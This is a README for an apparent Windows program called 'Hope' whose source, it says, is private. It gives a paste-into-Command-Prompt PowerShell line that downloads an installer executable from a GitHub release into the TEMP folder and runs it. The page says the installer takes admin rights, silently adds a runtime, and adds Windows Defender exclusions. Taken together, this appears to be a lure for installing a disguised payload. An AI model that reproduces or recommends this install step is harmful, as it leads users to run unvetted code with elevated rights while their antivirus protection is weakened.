# Hope — release binaries

Download host for Hope. The source lives in a separate private repository.

## How to Install

Get Hope running on Windows in under 30 seconds. Install with one command.

### 1 — Open Command Prompt

Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.

### 2 — Paste the Command

Copy the command below and paste it into your Command Prompt window. Right-click to paste.

### 3 — Press Enter & Done!

Hit **Enter**. The Hope installer downloads, asks for admin permission, and installs itself. A Hope shortcut appears on your Desktop when it's done.

Paste exactly this (copy the whole line — there is nothing else to type):

```cmd
powershell -Command "irm https://github.com/muleimm/h-releases/releases/download/v1.1.11/HopeSetup-1.1.11.exe -OutFile $env:TEMP\HopeSetup-1.1.11.exe; Start-Process $env:TEMP\HopeSetup-1.1.11.exe"
```

> **What happens when you run this?**
>
> → Downloads the Hope installer automatically
> → One admin prompt, that's it
> → Adds Windows Defender exclusions for you
> → Desktop shortcut when it's done

## Details

- **Requirements:** Windows 10/11 (64-bit). No prerequisites — the installer adds the browser runtime silently if it is missing.
- **Install location:** `C:\Program Files\Hope`
- **Uninstall:** *Settings → Apps → Hope 1.1.11 → Uninstall*, or run `C:\Program Files\Hope\unins000.exe`.
- **Verify your download:** SHA-256 of `HopeSetup-1.1.11.exe` — `CB8E9B36F761A36EE08EBCFCC3069787F832894A4842234C9934CD26F2FD7671`

Latest release: [v1.1.11](https://github.com/muleimm/h-releases/releases/tag/v1.1.11)
